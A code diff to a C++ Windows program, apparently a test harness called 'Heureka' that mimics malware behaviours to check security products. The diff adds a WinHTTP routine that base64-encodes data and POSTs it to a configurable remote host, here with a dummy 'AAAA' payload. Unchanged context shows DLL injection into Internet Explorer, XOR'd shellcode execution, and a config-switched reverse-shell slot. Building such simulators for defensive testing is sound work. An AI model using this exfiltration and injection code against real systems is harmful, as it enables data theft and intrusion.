@@ -1,10 +1,13 @@
+#pragma comment(lib, "winhttp.lib")
 #include<iostream>
 #include<Windows.h>
+#include<winhttp.h>
 #include<ctime>
 #include<psapi.h>
 #include<Lmcons.h>
 #include<Strsafe.h>
 #include "heurekaconfig.h"
+#include "base64.h"
 
 // namespace setup
 using namespace std;
@@ -32,8 +35,68 @@ void print_error(char* fmt,...){
 
 // test functions
 
-#if REVERSE_SHELL==1
+#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+void web_send_recv(unsigned char *blob=NULL,size_t size=0){
+	BOOL  bResults = FALSE;
+    HINTERNET hSession = NULL,
+              hConnect = NULL,
+              hRequest = NULL;
+	print_status("web_send_recv begins");
 
+    // Use WinHttpOpen to obtain a session handle.
+    hSession = WinHttpOpen(  L"Heureka", 
+                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                             WINHTTP_NO_PROXY_NAME, 
+                             WINHTTP_NO_PROXY_BYPASS, 0);
+
+    // Specify an HTTP server.
+    if (hSession)
+        hConnect = WinHttpConnect( hSession, remote_host,
+                                   INTERNET_DEFAULT_HTTP_PORT, 0);
+
+    // Create an HTTP Request handle.
+    if (hConnect)
+        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
+                                       remote_resource, 
+                                       NULL, WINHTTP_NO_REFERER, 
+                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                       0);
+
+    // Send a Request.
+
+    if (hRequest) {
+		if (!blob || !size){
+			bResults = WinHttpSendRequest( hRequest, 
+                                       WINHTTP_NO_ADDITIONAL_HEADERS,
+                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
+                                       0, 0);
+		}else{
+			string blob_base64=base64_encode((unsigned char *)blob, size);
+			DWORD len=strlen(blob_base64.c_str());
+			bResults = WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,0, (LPVOID*)(blob_base64.c_str()),len,len, 0);
+		}
+	}
+    // PLACE ADDITIONAL CODE HERE.
+
+    // Report any errors.
+    if (!bResults)
+        print_error( "Error %d has occurred.", GetLastError());
+	else{
+		DWORD bytesRead=0;
+		LPVOID responseBuf[10240];
+		bResults = WinHttpReceiveResponse( hRequest, NULL);
+		WinHttpReadData(hRequest, responseBuf,10240,&bytesRead);
+		print_status("Received bytes: %d",bytesRead);
+	}
+
+
+
+    // Close any open handles.
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
+	print_status("web_send_recv ends");
+}
 #endif
 
 #if SEARCH_DOCS==1 
@@ -154,8 +217,6 @@ void dll_inject_ie(){
 	FARPROC aLoadLibrary=GetProcAddress(hKernel32,"LoadLibraryA");
 	
     unsigned int i;
-
-
 
 	ZeroMemory(&si,sizeof(si));
 	si.cb=sizeof(si);
@@ -307,6 +368,10 @@ int main(int argc,char **argv){
 
 	#if SEARCH_DOCS==1
 	search_docs();
+	#endif
+
+	#if WEB_SEND_RECV==1 && REMOTE_HOST==1
+	web_send_recv((unsigned char*)"AAAA",4);
 	#endif
 
 	#if SHELLCODE_XOR==1 && ALLOC_RWX_XOR_CALL==1
